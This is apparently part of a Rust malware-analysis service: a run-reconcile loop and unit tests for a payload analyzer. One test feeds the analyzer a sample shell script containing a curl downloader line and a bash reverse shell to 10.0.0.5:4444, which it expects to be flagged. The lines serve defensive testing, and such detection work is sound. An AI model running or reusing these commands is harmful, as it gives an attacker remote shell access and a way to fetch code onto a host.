        // itself only. Skipped here means parked in place — a non-terminal
        // run stays non-terminal and oldest-first ordering hands it back to
        // the very next pass (the same retry contract the SWEEP_LIMIT cap
        // already promises), instead of every later run in the batch going
        // unreconciled for as long as that one record exists.
        let reconciled = crate::isolate::item(
            "workbench-reconcile",
            id,
            crate::workbench_es::update_run(&state.es, id, owner, |run| {
                let (reconciled, dirty) = reconcile_run(std::mem::take(run));
                *run = reconciled;
                Ok(dirty)
            }),
        )
        .await;
        match reconciled {
            Some(Ok(_)) => changed += 1,
            // A run that vanished or changed owner mid-sweep is not an error
            // worth shouting about; the next pass sees the current truth.
            Some(Err(crate::workbench_es::UpdateRunError::NotFound)) => {}
            Some(Err(error)) => {
                tracing::warn!(run_id = %id, ?error, "workbench-reconcile: update failed")
            }
            // None: isolate::item already named and logged the panic.
            None => {}
        }
    }
    tracing::debug!(
        scanned = targets.len(),
        reconciled = changed,
        "workbench-reconcile pass complete"
    );
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::workbench_domain::WorkbenchChild;
    use std::sync::Mutex;

    // PAYLOAD_DIRS is process-global; no other test in this crate reads it
    // (confirmed by grep before adding this), but serialize this module's
    // own tests against each other in case more are added later.
    static PAYLOAD_DIRS_LOCK: Mutex<()> = Mutex::new(());

    fn new_deterministic_child() -> WorkbenchChild {
        let now = chrono::Utc::now().to_rfc3339();
        WorkbenchChild {
            analyzer_id: "deterministic".into(),
            display_name: "Deterministic local analysis".into(),
            state: "queued".into(),
            created_at: now.clone(),
            updated_at: now.clone(),
            deadline: now.clone(),
            queue_deadline: now,
            attempts: 1,
            ..Default::default()
        }
    }

    /// A child left queued past its own queue deadline must reconcile to a
    /// terminal state. Observed live on a real run: a revdeck child sat
    /// "queued" for 24 hours against a 30-minute max_queue_age with
    /// updated_at frozen at creation, because nothing reconciles a run except
    /// an explicit fetch of it. This pins the half that is supposed to work,
    /// so a regression here is caught rather than only showing up as an
    /// unabortable run.
    #[test]
    fn a_child_past_its_queue_deadline_reconciles_to_terminal() {
        let past = (chrono::Utc::now() - chrono::Duration::hours(2)).to_rfc3339();
        let mut child = new_deterministic_child();
        child.analyzer_id = "revdeck".into();
        child.state = "queued".into();
        child.created_at = past.clone();
        child.updated_at = past.clone();
        child.queue_deadline = past.clone();
        child.deadline = past;
        child.cancelable = true;

        let run = WorkbenchRun {
            children: vec![child],
            ..Default::default()
        };
        let (reconciled, _) = reconcile_run(run);
        let child = &reconciled.children[0];

        assert!(
            workbench_domain::is_terminal_state(&child.state),
            "expected a terminal state, got {:?} -- an expired child that stays \
             queued is exactly the stuck run an operator cannot abort",
            child.state
        );
        assert_eq!(child.state, "timed_out");
        assert!(!child.cancelable, "a timed-out child is no longer cancelable");
    }

    /// Mirrors dashboard/workbench_test.go's
    /// TestWorkbenchDeterministicRunAndIdempotency: submits a payload with
    /// real reverse-shell/downloader content (plus a synthetic pre-scanned
    /// YARA match, standing in for a real analysis/yara/scanner.py hit)
    /// through the "deterministic" analyzer dispatch and asserts a
    /// completed state carrying real entropy/IOC/rule/YARA-informed risk
    /// data — the regression this fix closes always returned
    /// Err("deterministic analysis is not yet implemented in this tier")
    /// here instead.
    #[test]
    fn deterministic_analyzer_completes_with_real_entropy_ioc_and_yara_data() {
        let _guard = PAYLOAD_DIRS_LOCK.lock().unwrap();

        let dir = std::env::temp_dir().join(format!(
            "wb-deterministic-test-{}-{:?}",
            std::process::id(),
            std::thread::current().id()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let hash = "a".repeat(64);
        let sample = b"#!/bin/sh\n\
            curl http://example.invalid/x -o /tmp/x\n\
            bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n";
        std::fs::write(dir.join(&hash), sample).unwrap();
        // SAFETY: serialized by PAYLOAD_DIRS_LOCK above; no other test in
        // this crate reads PAYLOAD_DIRS.
        unsafe {
            std::env::set_var("PAYLOAD_DIRS", dir.to_str().unwrap());
        }

        let classification = classify_payload(sample);
        let mut child = new_deterministic_child();
        let yara_matches = vec!["Suspected_Reverse_Shell".to_string()];
        let result = submit_child(&hash, &classification, &mut child, &yara_matches);

        unsafe {
            std::env::remove_var("PAYLOAD_DIRS");
        }
        std::fs::remove_dir_all(&dir).ok();

        assert!(result.is_ok(), "expected a completed result, got {result:?}");
        assert_eq!(child.state, "completed");
        assert_eq!(child.result_url, format!("/payload-analysis/{hash}"));
        assert!(!child.retryable);
        assert!(!child.cancelable);
        // Real IOC extraction (the URL and the IP literal in the sample)
        // and real rule matches (network_downloader, reverse_shell_pattern)
        // must both be non-zero, and the YARA match must have pushed the
        // score to the higher (40-point) boost tier.
        assert!(
            child.summary.contains("2 IOC(s)") || child.summary.contains("3 IOC(s)"),
            "summary did not report real IOC data: {}",
            child.summary
        );
        assert!(
            child.summary.contains("2 rule match(es)"),
            "summary did not report real rule-match data: {}",
            child.summary
        );
        assert!(
            child.summary.starts_with("risk 100/100 (critical)"),
            "summary did not reflect the YARA-boosted risk score: {}",
            child.summary
        );
    }

    #[test]
    fn deterministic_analyzer_fails_cleanly_for_a_missing_payload() {
        let _guard = PAYLOAD_DIRS_LOCK.lock().unwrap();
        let dir = std::env::temp_dir().join(format!(
            "wb-deterministic-missing-{}-{:?}",
            std::process::id(),
            std::thread::current().id()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        // SAFETY: serialized by PAYLOAD_DIRS_LOCK above.
        unsafe {
            std::env::set_var("PAYLOAD_DIRS", dir.to_str().unwrap());
        }

        let hash = "b".repeat(64);
        let classification = classify_payload(b"");
        let mut child = new_deterministic_child();
        let result = submit_child(&hash, &classification, &mut child, &[]);

        unsafe {
            std::env::remove_var("PAYLOAD_DIRS");
        }
        std::fs::remove_dir_all(&dir).ok();

        assert_eq!(result, Err("deterministic analysis failed".to_string()));
    }
}
